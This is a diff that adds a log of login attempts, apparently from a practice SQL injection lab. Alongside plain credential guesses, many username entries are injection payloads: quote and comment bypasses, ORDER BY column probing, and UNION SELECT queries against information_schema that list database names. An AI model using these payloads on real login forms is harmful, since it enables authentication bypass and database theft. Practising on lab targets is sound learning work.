@@ -1,0 +1,207 @@
+User Name:adminPassword:pass
+User Name:admin'Password:pass
+User Name:adminPassword:passwordd'
+User Name:adminn'Password:passwoerd
+User Name:amnin'--+Password:
+User Name:Password:
+User Name:a--+Password:b--+
+User Name:Password:
+User Name:a--+Password:
+User Name:amnin'--+aPassword:a
+User Name:admin'Password:a
+User Name:admin';Password:passs
+User Name:a';"'Password:a
+User Name:rootPassword:root
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:1Password:1
+User Name:Password:
+User Name:adminPassword:aray
+User Name:Password:
+User Name:adminPassword:amry
+User Name:Password:
+User Name:dumbPassword:dumb
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:admin' #Password:
+User Name:adminPassword:admin
+User Name:adminPassword:123
+User Name:adminPassword:admin
+User Name:admin'#Password:213
+User Name:admin'Password:
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:admin Password:dumb
+User Name:admin'Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:admin%23 Password:dumb
+User Name:admin%23 Password:dumb
+User Name:admin%23 Password:dumb
+User Name:admin Password:dumb
+User Name:admin Password:dumb
+User Name:admin Password:dumb
+User Name:admin Password:dumb
+User Name:admin Password:dumb
+User Name:admin Password:dumb
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:dumb Password:dumb
+User Name:dumb Password:dumb
+User Name:Password:
+User Name:Password:
+User Name:123Password:123
+User Name:Password:
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:admin Password:admin
+User Name:admin Password:admin
+User Name:admin' Password:admin
+User Name:admin' Password:admin
+User Name:admin' Password:admin
+User Name:admin' Password:admin
+User Name:admin' Password:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:aPassword:a
+User Name:aPassword:a
+User Name:aPassword:a
+User Name:aPassword:a
+User Name:aPassword:a
+User Name:aPassword:a
+User Name:aPassword:a
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:ADMIN
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:admin'Password:admin
+User Name:admin'Password:admin
+User Name:admin'Password:admin
+User Name:admin'Password:admin
+User Name:admin'Password:admin
+User Name:admin'Password:admin
+User Name:admin'Password:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:dumbPassword:dumb
+User Name:adminPassword:admin
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin' Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin'# Password:123
+User Name:admin' Password:123
+User Name:admin' # Password:123
+User Name:admin'  order by 2 # Password:123
+User Name:admin'  order by 2 # Password:123
+User Name:admin'  order by 2 # Password:123
+User Name:admin'  order by 3 # Password:123
+User Name:admian' union select 1,database() from information_schema.schemata #  # Password:123
+User Name:admian' union select 1,database() from information_schema.schemata #  # Password:123
+User Name:admian' union select 1,group(schema_name) from information_schema.schemata #  # Password:123
+User Name:admian' union select 1,group(schema_name) from information_schema.schemata #  # Password:123
+User Name:admian' union select 1,group_concat(schema_name) from information_schema.schemata #  # Password:123
+User Name:admian' union select 1,group_concat(schema_name) from information_schema.schemata #  # Password:123
+User Name:adminPassword:admin
+User Name:admin   Password:123
+User Name:admin   Password:123
+User Name:admin   Password:123
+User Name:admin   Password:admin
+User Name:admin   Password:13
+User Name:admin   Password:13
+User Name:admin   Password:13
+User Name:admin   Password:13
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
